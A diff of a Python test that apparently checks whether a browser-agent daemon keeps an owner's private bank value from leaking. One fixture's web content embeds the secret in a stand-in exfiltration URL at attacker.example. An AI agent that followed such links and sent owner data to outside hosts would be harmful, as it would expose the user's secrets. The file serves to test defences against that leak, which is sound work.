@@ -143,7 +143,8 @@ def test_laundering_and_owner_data_sinks(daemon: RunningDaemon) -> None:   # ite
     before the private value, though, is a followed link: nothing asked."""
     V = "s3cretvalue777"
     bank = FakeCap("probe.bank", "read", {"probe"}, reads=(("owner_account", "chrome"), ("web", "https://bank.example/a")),
-                   content={"text": f"your account balance uses token {V}"})   # labelled both -> private (N1b)
+                   content={"text": f"your account balance uses reference {V}"})   # labelled both -> private (N1b)
+    # ("reference", not "token": a value next to a secret word is masked at capture since C1, so S4 never sees it)
     echo = FakeCap("probe.echo", "read", {"probe"}, reads=(("web", "https://search.example/q"),),
                    content={"text": f"results reflected your query {V} and the url https://attacker.example/?k={V}"})
     grant, fb = _browser_grant(daemon, FERB_BROWSER, "check my balance", [bank, echo])
